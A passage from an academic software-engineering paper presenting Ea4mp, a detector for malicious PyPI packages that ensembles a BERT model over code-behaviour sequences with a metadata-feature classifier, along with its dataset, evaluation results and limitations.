be\\ndescribed by a manually defined feature set.\\nAs demonstrated in the example above, the attacker distributed\\nthe attack code across at least three script files to achieve their\\nmalicious goals. In addition, the attacker also employs custom ma-\\nlicious functions to increase the difficulty of manually extracting\\nfeatures. Based on these findings, there is a need for a comprehen-\\nsive analysis of code packages that considers the propagation of\\ncode behavior across files in an automated manner without requir-\\ning manual feature extraction. Therefore, our approach performs\\ncall graph (CG) [5, 3] and control flow graph (CFG) extraction for\\nall the scripts of the PyPI package to be detected and expresses the\\nMetadata-V ersion:\\nName:\\nV ersion:\\nSummary: \\nHome-page:\\nAuthor:\\nAuthor-email: \\nDescription:\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n2.1\\nrequstss\\n1.0.0\\nYFqdzDnaUEbcMZA..\\nUNKNOWN\\nYZuWUeBS\\nUShwmeSTygg@gmail.com\\nQUIZGtjBPQapseaPxl…\\nFigure 4: Metadata in thePKG-INFO.\\nglobalcallingandbeingcalledrelationshipofeachfunctionineach\\nscript file using the form of a sequence.\\nFinding 2: Metadata contains a wealth of useful informa-\\ntion.Existing research has already highlighted that elements in-\\ncluding package name, version, and author name can positively\\ndetect malicious packages. However, ouranalysis revealed that,\\nbesides these three basic metadata elements, other information,\\nsuch as summary and description, can also expose the attacker. By\\nanalyzing the metadata of existing malicious packages, we found\\nthat metadata formats are relatively fixed and contain a wealth of\\ninformationaboutthepublishers.Previousworkanalyzedmetadata\\nbyextractingpackagenameandversionbasedonlyonthepackage\\nname, ignoring thePKG-INFO file, which contains a lot of metadata\\ninformation.Maliciousattackersoftenrevealtheirintentionsinthis\\nsection by, for instance, inputting random strings as the package\\ndescription or author name or deliberately hiding their identity.\\nWe also found this phenomenon is widespread among malicious\\npackages. As shown in Figure 4, we also comprehensively analyzed\\nthemetadataofthemaliciouspackagerequstss-1.0.0.Wenoticed\\nthat the way attackers fill out the metadata of malicious packages\\nsignificantly differs from that of regular developers. As shown in\\nlines 4 and 8, the attacker inputs long strings of random, invalid\\ncharacters from the keyboard to fill in the basic description infor-\\nmationofthepackage.Thesestringslackanysemanticinformation\\nand do not conform to human natural language norms, making\\nthem easily identifiable using existing approaches. We manually\\nanalyzed a large amount of malicious package metadata and de-\\nveloped a relatively comprehensive feature set. To transform the\\nmetadata information into feature vectors that can be processed by\\nthe model, we use 0, 1, 2, ... to discretize the metadata information\\n(e.g.,0meansthatthefiledoesnotcontainthatpieceofinformation,\\n1 means that the information is normal, 3 means that there is an\\nanomaly in that piece of information,etc.)\\nBy extracting these two types of information, we can analyze\\nthe PyPI packages to be detected in a very comprehensive way.\\nHowever, we also note that these two kinds of information are\\ncompletely different; one is a sequence of code behaviors that need\\nto be preprocessed by the model to be correctly identified by the\\nmodel, while the other is a discretized feature vector that can eas-\\nily be used to train the model. Therefore, we process these two\\nkinds of information separately. Large language model fine-tuning\\nis performed using code behavior sequences. For metadata feature\\nvectors, we compare different machine learning models (including\\nNaive Bayes, decision tree, random forest, and support vector ma-\\nchine), as shown in Section 4.4 Naive Bayes and Random Forest\\nperformed better than any of the other models. Finally, to provide\\n1162\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\nCode Behavior Sequence-based Model Fine-tuning\\nMetadata Features Vector-based Model Training\\nSequence Generation \\n& Segmentation\\nTraining Dataset\\nTarget Packages\\nBenign Package\\nMalicious Package\\nFine-tuning\\nFeature Extraction & \\nDiscretization\\nTraining Machine \\nLearning Model\\nCode Behavior Sequences \\nMetadata Feature Vectors\\nModel Ensemble\\nSource code\\nMetadata\\nFigure 5: The overview of Ea4mp.\\na comprehensive consideration of code behavior sequences and\\nmetadata feature vectors, we ensemble the large language model\\nand the machine learning model using the AdaBoost algorithm.\\nCodebehaviorsequencesandmetadatafeaturevectorsareliketwo\\nmillstones that crush the malicious packages.\\n3 METHODOLOGY\\nThe workflow of Ea4mp is described in Figure 5 mainly consists of\\nthefollowingthreesteps. Step1:CodeBehaviorSequence-based\\nModel Fine-tuning.First, we extracted code behavior sequences\\nbased on CG and CFG for all script files in the PyPI package to\\nbe detected. The extracted code behavior sequences will be sliced,\\nlabelled, and then fed into the BERT model for fine-tuning.Step\\n2: Metadata Features Vector-based Model Training.We ex-\\ntract features from thePKG-INFO file and discretize the extracted\\nfeatures. The discretized feature vectors are then input into the ma-\\nchine learning models for training.Step 3: Model Ensemble.We\\nensemblethefine-tunedBERTmodelandthewell-trainedmachine\\nlearning model using the Adaboost algorithm to obtain our final\\nensemble approach.\\n3.1 Code Behavior Sequence-based Model\\nFine-tuning\\nCode behavior sequences extraction and segmentation.Fol-\\nlowing [24], We training a FastText [2] model with word embed-\\ndings and use this model to sort the depth-first traversal sequences\\noftheCG.Then,basedonthesorteddepth-firsttraversalsequences\\nand the CFG, we extract canonical code behavior sequences. Since\\nour approach analyzes entire software packages, the extracted se-\\nquences are often very long. The BERT model, however, limits the\\ninput sequence to a maximum of 512 tokens. Therefore, we need\\nto segment the extracted sequences. As shown in Figure 6, we find\\nthat the sequence of code behaviors is stitched together from the\\ncode sequences of the individual functions in each py file. For ex-\\nample,segmentation1containsthecodesequencesofthefunctions\\n(__init__), (iter), (minor_iter), etc.from the file A. In order to satisfy\\nthe model’s restriction on token length, we have to segment the\\nsequence. First we add the[CLS] tag at the beginning of the whole\\nsequence to remind the model that this is a new sequence, then we\\nscanthetokenlengthofeachfunctionsequence,andifthelengthof\\nthe segmentation is no more than 512 tokens, we add the function\\nsequence to the segmentation, as shown in the figure, when we\\n[CLS]\\n(A.__init__): <builtin>.super __init__ \\n(A.iter): numpy.array <call> .array <call>FistaSolver.proximal_gradient_line_search\\n<call>FistaSolver.proximal_gradient_line_search\\n(A.minor_iter):<builtin>.abs numpy.linalg.norm <builtin>.abs numpy.tensordot numpy.tensordot\\n……\\n[SEP]\\n(C.print_header): <builtin>.print \\n(C. disp): <builtin>.len <builtin>.max format <builtin>.print \\n(D.compute_optdes_crit): <call>SLassoSolver.compute_information_matrix numpy.linalg.lstsqdot \\ndual_value append append ravel ravel dot \\n……\\n[SEP]\\n…\\n[SEP]\\n(X.compute_tstar_screening_vec): <call>...compute_optdes_crit dot numpy.linalg.norm <builtin>.range \\n<builtin>.max dot numpy.linalg.inv numpy.linalg.inv dot dot numpy.atleast_2d numpy.linalg.norm\\nnumpy.tensordot numpy.eye dot <call>...min_dim1 append ravel numpy.linalg.lstsq ravel dot numpy.array\\ndot numpy.linalg.norm numpy.linalg.norm <builtin>.range <builtin>.max ravel ravel dot \\n[SEP] , LABEL=0\\nSegmentation 1\\nSegmentation 2\\nSegmentation N\\n瀖\\nFigure 6: Code behavior sequence example.\\nscan to the(print_header) function in the file C, the token length of\\nthe previous segmentation has exceeded 512, so we add the[SEP]\\ntag in front of(print_header) as a separator to remind the model\\nthat this is a new segmentation. This loops until the last function,\\nthe sequence from the(compute_tstar_screening_vec) function in\\nthe file X, is added to the segmentation N, and we add the[SEP]\\ntag at the end to indicate that this is the end of the entire sequence.\\nFinally, we append aLABEL tag at the end to indicate whether the\\nsequence comes from malicious (1) or benign (0) samples.\\nFine-tuning BERT model.By leveraging its inherent pooling\\nlayer, BERT can conduct weighted average pooling across vari-\\nous segments of lengthy texts, guided by manually assigned labels\\n(such as[SEP]). This feature facilitates the aggregation of infor-\\nmation from multiple segments, thereby enhancing the model’s\\ncapability to comprehend extensive textual inputs. This effectively\\naddresses the inconvenience caused by the token length limitation.\\nThe labeled sequences are then fed into a pre-trained BERT model.\\nDuring this stage, the model is fine-tuned to adapt to the specific\\ncharacteristics of the standardized code behavior sequences. Fine-\\ntuning involves adjusting the pre-trained model’s weights based\\non the newly labelled data, allowing BERT to learn patterns and\\nfeatures specific to the task. This step ensures that the fine-tuned\\nBERTmodelaccuratelyclassifiesthesequences,leveragingtherich\\ncontextual representations learned during pre-training.\\n1163\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nTable 1: The feature set of metadata\\nType Feature Description\\nPackage info Package Size Size\\nPackage Name Similarity to popular packages\\nVersion Metadata Version Whether the version number is abnormal\\nPackage Version Whether the version number is abnormal\\nAuthor information\\nAuthor Name Whether the author has ever published a malware package\\nHome Page Whether the author publishes the homepage of the package\\nAuthor Email Whether the author publishes the email\\nDescription Summary The summary is consistent with the package content\\nDescription The description is consistent with the package content\\n3.2 Metadata Features Vector-based Model\\nTraining\\nTable 1 shows the nine feature sets we selected for metadata and\\nthe criteria for discretizing them. Since PyPI automatically gener-\\nates metadata files during the Python package distribution process\\nand saves all metadata information in the PKG-INFO file, we have\\nchosenthePKG-INFOfileasthesourceforextractingourmetadata\\nfeature set and after a detailed manual analysis of the metadata of\\ncollected malicious packages, we identified nine types of metadata\\nfeatures. Considering that the Naive Bayes model can only handle\\ndiscrete data, we categorized the features based on their character-\\nistics to meet the requirements of subsequent model training.\\nPackage Size and Name.Package names and sizes play a crucial\\nrole in detecting malicious packages. Attackers often use names\\nsimilar to popular packages to confuse users and trick them into\\ndownloading malicious software. This strategy increases the likeli-\\nhood of malicious packages being downloaded through phishing\\nattacks and typosquatting [27]. Package size is also a key feature,\\nas malicious packages are typically smaller because they usually\\ncontainsimplescriptsforexecutingmaliciousactivitiesratherthan\\ncomplex functionalities. In our collected dataset (described in Sec-\\ntion4.1.1),2,826maliciouspackages(83.02%)aresmallerthan10KB\\nin size, 562 (16.51%) are larger than 10KB but smaller than 1MB,\\nand only 4 (0.12%) are larger than 10MB.\\nTo determine whether the package to be detected misled users\\nto download by disguising its own package name as the popular\\npackage name, we selected the packages with more than 100,000\\ndownloads on PyPI as the popular package and calculated the sim-\\nilarity between the to-be-detected PyPI package‘s name and the\\npopular package name by using edit distance. We discretize the\\npackage name similarity using the numbers 1-10, where 10 means\\nthe similarity is greater than 90% and 1 means the similarity is less\\nthan 10%.\\nVersion.The package version typically reflects the software’s up-\\ndate and maintenance status; frequent updates with no significant\\nchanges might indicate a malicious package, as attackers could use\\nfrequent updates to evade detection [40]. The metadata version\\nindicates the format version of the package’s metadata. Malicious\\npackages might use older or non-standard metadata formats to\\nhide their true intentions. By analyzing the package version and\\nmetadata version, abnormal update patterns and non-compliant\\nmetadata formats can be identified.\\nAuthorInformation. Maliciousattackersoftenusefakeoranony-\\nmous author information, such as randomly generated strings or\\nirrelevant names. These irregular author details can serve as clues\\nto identify malicious packages.\\nDespite PyPI’s signature mechanism, malicious authors can still\\ndeceive detection systems and upload malicious packages through\\nvarious means. The signature mechanism primarily verifies the\\nsource and integrity of a package but cannot determine the pack-\\nage’sintentorcontentsafety.Attackersmightfirstestablishagood\\nreputationovertimebyreleasingharmlesspackagesandthengrad-\\nually introduce malicious code. Furthermore, attackers can use\\nmultiple accounts to release malicious packages, evading detection.\\nThey might also employ social engineering tactics to gain trusted\\ndevelopers’ signature permissions, thereby publishing malicious\\npackages.\\nDescription. Description section in metadata provides a crucial\\ndescription of the software package’s functionality and features,\\naiding users in understanding its purpose and capabilities. The De-\\nscription section also plays a significant role in detecting malicious\\npackages. Malicious software often employs deceptive language in\\nthe Description, exaggerating its functionality or providing false\\ninformation to lure users into downloading. Additionally, attackers\\nmay intentionally obscure descriptions to conceal malicious behav-\\nior, making it appear legitimate. By carefully analyzing the content\\nof the Description section, potential malicious software features,\\nsuch as false promises, descriptions inconsistent with functionality,\\nor unclear descriptions, can be identified, thereby enhancing the\\naccuracy and effectiveness of malicious package detection.\\nTraining Machine Learning Model.Our choice of classifier is\\ndictated by the relatively low dimensionality of the metadata fea-\\nture vectors and the subsequent need for ensemble approaches.\\nAccordingtothediscretizationrulesinTable1,wetransformedthe\\nmetadatafeaturesintovectorsanddefinedthelastdimensionofthe\\nvector as the label, where 1 indicates that the sample is a malicious\\npackage and 0 indicates that the sample is a benign package. To\\ntrain the classifiers, we input the metadata feature vectors of all\\nsamplepackagesintothemodelandsavedthetrainedmodellocally\\nto facilitate subsequent ensemble approaches.\\n1164\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\n3.3 Model Ensemble\\nWe chose the AdaBoost algorithm, which can adaptively adjust\\nthe model weight distribution, to ensemble the fine-tuned BERT\\nmodel and the well-trained machine learning model. Initially, we\\nset the weights of the two models to𝑤BERT =𝑤ML = 1\\n2. Then, we\\niteratively adjusted the weights of each model. In each iteration,\\nwe calculated the error sum of each classifier:\\n𝜖BERT =\\n𝑁/summationdisplay.1\\n𝑖=1\\n𝑤𝑖 ·𝐼 (𝑦𝑖 ≠ℎBERT(𝑥𝑖 ))\\n𝜖ML =\\n𝑁/summationdisplay.1\\n𝑖=1\\n𝑤𝑖 ·𝐼 (𝑦𝑖 ≠ℎML(𝑥𝑖 ))\\nwhere𝑁 representsthetotalnumberofsamplesinthetrainingdata,\\n𝑤𝑖 represents the weight of the𝑖-th sample,𝑦𝑖 represents the true\\nlabel of the𝑖-th sample,ℎ(𝑥𝑖 ) and represent the predictions of the\\nBERT model and the machine learning model for the𝑖-th sample,\\nand𝐼 (𝑦𝑖 ≠ ℎ(𝑥𝑖 )) are indicator functions that take the value of 1\\nwhen the𝑖-th sample is misclassified, and 0 otherwise. Then, we\\nupdated the model weights according to the formula:\\n𝑤BERT = 1\\n2 ln\\n(1−𝜖BERT\\n𝜖BERT\\n)\\n𝑤ML = 1\\n2 ln\\n(1−𝜖ML\\n𝜖ML\\n)\\nWe set the total number of iterations to 50. After 50 iterations, we\\nobtained the final model combination:\\n𝐻 (𝑥) = sign(𝛼BERTℎBERT(𝑥)+ 𝛼MLℎML(𝑥))\\nwhere𝐻 (𝑥) represents the final ensemble model, which performs\\nthefinalclassificationbyweightedcombiningthepredictionsofthe\\nBERTmodelandthemachinelearningmodel,andthe signfunction\\nreturns the sign of the result, with +1 indicating the positive class\\nand -1 indicating the negative class.\\n4 EVALUATION\\nTo evaluate Ea4mp, we investigate the following three research\\nquestions:\\n• RQ1: Is Ea4mp more effective compared to other detection\\napproaches?\\n• RQ2: Can Ea4mp identify malicious packages that exist in\\nthe wild?\\n• RQ3: Does Ea4mp perform better than individual models?\\n4.1 Experimental Design\\n4.1.1 Dataset. To better validate the performance of Ea4mp, we\\nconstructed a dataset consists two main parts.\\nMalicious Sample.Due to ethical and moral considerations, re-\\nsearchers tend to avoid publicly disclosing known malicious pack-\\nages, and PyPI officials also recommend against publishing them\\non open platforms. Consequently, the datasets used to train cur-\\nrent detection approaches are generally small, leading to issues\\nsuch as overfitting and so on. As shown in Table 2, We collected\\nand filtered publicly available datasets from Duan [17], Ohm [31],\\nSnyk [12], and Guo [21] (As of March 2, 2024). From these datasets,\\nTable 2: Statistics of the constructed dataset\\nDataset #Malicious #Benign\\nGuo et al. [21] 2,888 -\\nOur 516 10,000\\nTotal 3,404 10,000\\nwe collected 2888 malicious PyPI packages that can be used for\\ntraining and testing. Of course, no dataset is too large, and the\\nlarger the dataset is, the more likely it is to avoid overfitting the\\nmodel.Also,encompassingnewlyemergedmaliciouspackagesinto\\nthe malicious package set can help model more comprehensively\\nin identifying existing malicious behaviors. So following [21], they\\nfound that although the PyPI official repository had removed most\\nmalicious packages, many of these packages were still available on\\nothermirrorsources[11,42,16,10,13].Weexpandedthedatasetby\\nsearching various mirror sources and discovered an additional 516\\nmalicious packages that were not included in the existing dataset.\\nFinally, we obtained a dataset containing 3,404 malicious packages.\\nBenign Sample.Following [24], we randomly downloaded 10,000\\npackages from PyPI. These packages were hosted on PyPI for more\\nthan 90 days and had been downloaded over 1,000 times. We used\\nthese packages as the benign sample set.\\n4.1.2 Baselines. To evaluate the performance of Ea4mp against\\nexisting approaches, we selected three SOTA approaches as our\\nbaselines for comparison. These three approaches are VirusTo-\\ntal [14], OSSGadget [1], and Bandit4Mal [43]. VirusTotal [14]\\nprovides an online detection platform where packages can be up-\\nloaded directly for analysis. It automatically detects whether the\\nsoftware package contains suspicious files, IPs, URLs,etc. OSSGad-\\nget [1] can identify potential backdoors and malicious code within\\na package. Bandit4Mal [43] is an approach to finding common\\nsecurity issues in Python code. It processes each file, builds an\\nAbstract Syntax Tree (AST) from it, and runs appropriate plugins\\nagainst the AST nodes. Since a few recent works either lacked the\\nactionable implementation details [40, 50] or had some technical\\nissues1 [24], we did not compare our approach with their repro-\\nduced versions to avoid the biased results caused by inconsistent\\nimplementations.\\n4.1.3 Implementation. We implement EA4MP in Python using Py-\\nTorch [32]. Our experiments are performed on a Linux workstation\\nwith an AMD RYZEN 7735HS CPU, 32GB RAM, and an NVIDIA\\nV100 GPU with 32GB memory, running Ubuntu 22.04 with CUDA\\n12.1.ForPythonscripts,wefirstemployPyCG[39]toconstructCG\\nandsortitbyusingthedepth-firstalgorithmandFastTextmodel[2].\\nThen, we apply StatiCFG [9] to extract ordered code behavior se-\\nquences from sorted CG and fine-tune the pre-trained BERT model\\n(downloaded from HuggingFace [45]) with a learning rate of 1𝑒-5.\\nFor metadata, we use regular-expression to match keywords.\\n1We reached to the authors for help, and they acknowledged that they had received\\nsimilar feedback from other users. Unfortunately, the implementation of MPHunter\\n[24] was still not reproducible when we submitted the paper.\\n1165\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nTable 3: Performance comparison with the state-of-the-art\\nbaselines\\nApproach Precision Recall F1-score\\nVirusTotal [14] 92.8 81.1 86.6\\nOSSGadget [1] 79.6 86.9 83.1\\nBandit4Mal [43] 84.7 97.8 90.9\\nEa4mp 99.2 96.0 97.6\\n4.1.4 Evaluation Metrics. We employ three widely-used binary\\nclassification metrics, includingPrecision,Recall, andF1-score, for\\nevaluation. Precision refers to the ratio of truly malicious samples\\namong the detected ones, while Recall measures the percentage of\\nmalicious packages that are retrieved out of all known malicious\\npackages. F1-score is the harmonic mean of Recall and Precision,\\nand calculated as: 2× 𝑅𝑒𝑐𝑎𝑙𝑙 ×𝑃𝑟𝑒𝑐𝑖𝑠𝑖𝑜𝑛\\n𝑅𝑒𝑐𝑎𝑙𝑙 +𝑃𝑟𝑒𝑐𝑖𝑠𝑖𝑜𝑛 . To ensure the stability of\\nthe results, we used ten-fold cross-validation and took the average\\nof the test results as the final outcome.\\n4.2 RQ1: Effectiveness\\nExperiment Setup.We divided the dataset into ten equal parts,\\nnine of which were used for model training and one for model\\ntesting. To ensure the fairness of the experimental results, we use\\nthe same training set and test set to train and test Ea4mp against\\nOSSGadget, Bandit4Mal. Since VirusTotal provides an online\\ndetectionplatform,weonlyusethetestsettoverifyitsperformance.\\nResults.Table3showstheperformanceof Ea4mpcomparedtothe\\nthreebaselineapproachesonthesamedataset.Comparingthedata\\nin the table, it is evident that Ea4mp improves precision by 6.9% to\\n24.6% over the other approaches, achieving the highest precision\\namong all. Regarding recall, Ea4mp improved by 18.4% to 10.5%\\ncomparedtoVirusTotalandOSSGadget.AlthoughEa4mp’srecall\\nis slightly lower than Bandit4Mal, our precision is much higher\\nthanBandit4Mal,whichmeansthatafterdetection,wedon’tneed\\na lot of manual review to verify that the package that been labeled\\nas suspicious is malicious.\\nAnalysis. Due to the inherent limitations of these approaches,\\ntheirperformanceisnotasgoodasEa4mpprimarilybecause: First,\\nrule-based and pattern-based detection approaches (such as Ban-\\ndit4mal, OSSGadget) often misclassify behaviors like network\\nconnections and file operations in normal packages as malicious.\\nThe primary reason for this misjudgment is that these approaches\\nstruggle to differentiate the differences between malicious and nor-\\nmalbehavior. Second,VirusTotalisineffectiveagainstdiverseand\\nconstantly evolving malicious code because maintaining consistent\\nfingerprints for malicious code is challenging. This inconsistency\\nmakes it difficult for signature databases to capture the latest mali-\\ncious packages. Furthermore, OSSGadget focuses on identifying\\nbackdoorsandotherobviousmaliciousbehaviors.Thisfocusmakes\\nit hard for them to detect more covert malicious activities, such as\\ninformationtheftandunauthorizedfiles.Additionally,asrule-based\\ndetection approaches, these approaches cannot deeply analyze the\\ncode’s execution path and its interactions with external resources,\\nlimiting their ability to detect malicious behavior.\\nAnswer to RQ1:Ea4mp outperforms the existing baselines in\\nmost aspects. Although it is slightly inferior to Bandit4mal in\\nterms of recall, the precision of Ea4mp is 17.1% higher than that\\nof Bandit4mal.\\n4.3 RQ2: Practicality\\nExperiment Setup.In order to validate whether Ea4mp can dis-\\ncover malicious packages that exist in the wild, we crawledall\\npackages uploaded to PyPI between March 28, 2024, and April\\n18, 2024, from the official website [34], and removed empty ones\\nwithout Python scripts. In total, we collected 46,573 packages for\\nreal-world validation. Two authors separately review the reported\\nmaliciouspackages.Allsuspiciouspackages(includingsamplesthat\\ndid not reach a consensus) would be forwarded to a security expert\\nfromaprominentITenterprisewithatleastfiveyearsofexperience\\nin software supply security to conduct a secondary review.\\nOverall Performance.In total, Ea4mp discovered 139 suspicious\\npackages. After manual review, 119 (85.6%) out of them were con-\\nfirmed as malicious. We reported these malicious packages to the\\nPyPI official. As of May 1, 2024, 82 of them have been removed.\\nFalse Positive.By analyzing the 20 packages that were misclassi-\\nfied as malicious, we found that these false positives can be cate-\\ngorized into two main types.First, package name squatting. Some\\ndevelopers of popular packages may proactively upload packages\\nwith names similar to their popular packages to prevent attackers\\nfromusingtyposquattingtotargetthem.Thesepackagesoftencon-\\ntain parts of the popular package’s code and are missing part of the\\nmetadata. Since Ea4mp considers both the metadata and the source\\ncode, it can lead to false positives. This type of false positive also\\nvalidatestheimportanceandeffectivenessofincludingmetadataas\\na key indicator of a package’s maliciousness.Second, some benign\\npackagesusethesameAPIsasmaliciouspackagesbutforlegitimate\\npurposes. For example, some benign packages also use the request\\npackage to upload or download corresponding payloads, but they\\ndonotstealusers’privateinformationorinstallmaliciouspayloads\\non the user’s host. These insights can help refine our model and\\nreduce false positives in future iterations.\\nWe used t-SNE [6] to visualize the feature vectors of code behav-\\nior sequences and metadata processed by the BERT model and the\\nmachine learning models for both malicious and benign packages,\\nas shown in Figure 7. This figure clearly shows a distinct separa-\\ntion between malicious and benign packages in the feature space,\\nfurther validating the effectiveness of Ea4mp.\\nAnswer to RQ2:Ea4mp has indeed newly uncovered 119 ma-\\nlicious packages and 82 of them have been removed by PyPI\\nofficials.\\n4.4 RQ3: Ablation Study\\nExperiment Setup.To verify that Ea4mp performs better than an\\nindividual classifier, we tested the ensemble model, the fine-tuned\\nBERT model, and the machine learning models using the same\\ndataset. In addition, to evaluate the effectiveness of different ma-\\nchinelearningalgorithmsinhandlingmetadatafeaturevectorsand\\nto find the optimal choice for ensembling, we used four different\\nmachine learning algorithms, including Naive Bayes(NB), Decision\\n1166\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\n(a) t-SNE visualization of metadata feature vector\\n(b) t-SNE visualization of code behavior sequences\\nFigure 7: Visualization of malicious and benign packages.\\nTable 4: Comparison of the performance between different\\nvariants\\nApproach Precision Recall F1-score\\nEnsemble-AdaBoost 99.2 96.0 97.6\\nEnsemble-equal 95.9 92.3 94.1\\nBERT-only 98.2 90.6 94.2\\nNaive Bayes 76.1 81.3 78.6\\nDecision Tree 67.1 45.3 54.1\\nRandom Forest 80.2 76.4 78.3\\nSupport Vector Machine 76.1 69.3 72.5\\nTree(DT), Random Forest(RF), and Support Vector Machine (SVM),\\nto train four classifiers and tested their performance. The experi-\\nmental results are shown in Table 4. To validate whether using the\\nAdaBoost algorithm to adjust model weights adaptively performs\\nPrecision Recall F1\\n60\\n65\\n70\\n75\\n80\\n85\\n90Performance(%)\\nEA4MP\\nw/o pkgSize\\nw/o pkgName\\nw/o metaVer\\nw/o pkgVer\\nw/o autName\\nw/o homePage\\nw/o autEmail\\nw/o summary\\nw/o description\\nFigure 8: Sensitive analysis of the impact of different meta-\\ndata features on our approach.\\nbetter than directly assigning weights to the models, we also set\\nthe weights of both models to 0.5 and performed the ensemble.\\nResults And AnalysisBy comparing the data in Table 4, it is\\nevident that the ensemble approach outperforms the individual\\nmodels across all metrics. Compared to the individual BERT and\\nmachine learning models, the ensemble model improved precision\\nby 1%-47.8% and recall by 5.9%-111.9%. Compared to the model\\nwherewedirectlymaketheirmodelweightsequal,themodelpreci-\\nsion and recall after the ensemble using the AdaBoost algorithm is\\nimprovedby3.4%and4.0%.Weevenfoundthattheprecisionofthe\\nensemble model with equal weights is even 2.3% lower than that of\\nthe single BERT model. This implies that the weight assignment of\\nthe model needs to be modified adaptively using the algorithm in\\nthe iterations for better performance.\\nIn terms of handling metadata feature vectors, from the experi-\\nmental results, it is evident that the performance of Naive Bayes\\nand Random Forest models is superior compared to other machine\\nlearning models. Considering that the overall dimension of the\\nextracted feature vectors is relatively low and that some features\\nmight inevitably be missing during the feature extraction process,\\nNaive Bayes can handle these missing features effectively. Addi-\\ntionally, the Naive Bayes model has a higher F1 score. Therefore,\\nwe chose to combine the Naive Bayes model with the BERT model\\nfor the ensemble.\\nTo explore whether all metadata features are beneficial for mali-\\nciouspackagedetection,weremovedonemetadatafeatureatatime\\nand respectively trained an NB model to examine their individual\\ncontributions. The experimental results are shown in Figure 8. We\\ncan observe that all metadata features are essential to achieve the\\nbest performance, andDescription (one of our newly discovered\\nmetadata features) really makes a great contribution, resulting in\\nan absolute increase of 6.2% in precision and 9.9% in recall. The\\nresultsindicatethateachmetadatainformationdoesplayaroleand\\nbrings a performance improvement in malicious package detection.\\n1167\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\nAnswertoRQ3: Ourensembleapproachindeedperformsbetter\\nthan the individual non-ensemble models. Using the Adaboost\\nalgorithm to ensemble the models, it is also true that adaptively\\nassigning weights to the models can assist in identifying mali-\\ncious packages better than presetting weights for the models.\\n5 DISCUSSION AND LIMITATIONS\\nUsage Scenario.Similar to existing static solutions [40, 50], our\\napproach primarily focuses on scanning Python scripts. Despite\\nits wide applicability in detecting malicious packages in the PyPI\\necosystem, we also notice that other executable files can also be\\nexploited as the carriers of malicious code. For example, DLL-\\nsideloading [28] exploits the placement of a malicious Dynamic\\nLink Library (DLL) in a directory where a legitimate application\\nis expected to load it, allowing the attacker to execute unautho-\\nrized code. Nonetheless, such attack is similar in nature to Trojan\\nviruses by downloading malicious DLLs to the target directory of\\nthe victim host via malicious scripts in the packages. Although\\nwe do not directly deal with these executables (e.g., DLLs), their\\nsuspicious downloading behaviors may also be included in ordered\\ncodebehaviorsequencesofPythonscriptsandthuscanbedetected\\nby our approach. We randomly analyzed 100 malicious packages of\\nour testing set, and found 53 Trojan viruses. As a result, 49 out of\\nwhich are successfully detected, demonstrating the effectiveness of\\nour approach in the face of this case. We leave such exploration for\\nour future work.\\nCodeObfuscation. Codeobfuscationisacommontechniqueused\\ntoevadeexistingdetectionapproaches.Currently,mostapproaches\\nprimarily analyze software packages based on their source code\\nfiles. Some attackers circumvent detection by packaging their code\\nintobinaryexecutablefiles.Forexample,asmentionedinsection1,\\nthe \"xz\" package employed this method. Detecting such packages\\nrequires software security professionals to have reverse engineer-\\ning skills and to continuously monitor the resource usage of the\\nsoftware package during execution.\\nFortunately, code obfuscation also requires some technical ex-\\npertise from the attackers. Currently, the majority of malicious\\nsoftware packages mainly obfuscate the parameter values of func-\\ntions. This means that Ea4mp can still accurately capture the code\\nbehavior sequences and detect them. Overall, Ea4mp meets the de-\\ntectionneedsofmostexistingsoftwarepackages.However,whether\\nwe can utilize machine learning, deep learning, or large language\\nmodels to deobfuscate more complex forms of code obfuscation\\nremains a challenge that we need to address.\\nPythonVersion. TheevolutionofPythonitselfcanalsoimpactthe\\nretrieval of code behavior sequences. This is particularly true for\\nthe significant changes that occurred between Python 2.0 and 3.0\\nversions. The CG and CFG generation tools we selected only sup-\\nport packages written in Python 3.0 and above. During our actual\\ntraining process, we found that 42 malicious packages (accounting\\nfor 1.2% of the total malicious packages) used Python versions be-\\nlow 3.0. In contrast, none of the selected benign sample packages\\nwere found to use versions below Python 3.0.\\nOf course, we can choose other tools to generate code behavior\\nsequences for these packages. This doesn’t require a high level of\\ntechnicalexpertise,andwecaneasilyreplacethetools.Additionally,\\ntheuploadtimesoftheseolderversionmaliciouspackagesindicate\\nthat they were uploaded quite early. Newly discovered malicious\\npackages are still developed based on Python 3.0 and above.\\nLarge Language Models.Ea4mp has demonstrated with real data\\nthat large language models, such as BERT, exhibit excellent per-\\nformance in analyzing malicious behavior in code. This indicates\\nthat the application of large language models can significantly mit-\\nigate security threats in the open-source software supply chain.\\nHowever, as described in section 4.4, Ea4mp focuses solely on the\\nrelationships between various API and function calls, ignoring the\\nparameters passed within these functions. This resulted in nine\\nbenign packages being falsely labelled as malicious because they\\ninvoked APIs similar to those used by malicious packages. There-\\nfore, utilizing large language models to analyze functions and their\\nparametersinthesourcecodecouldbeafeasibleresearchapproach\\nto reduce false 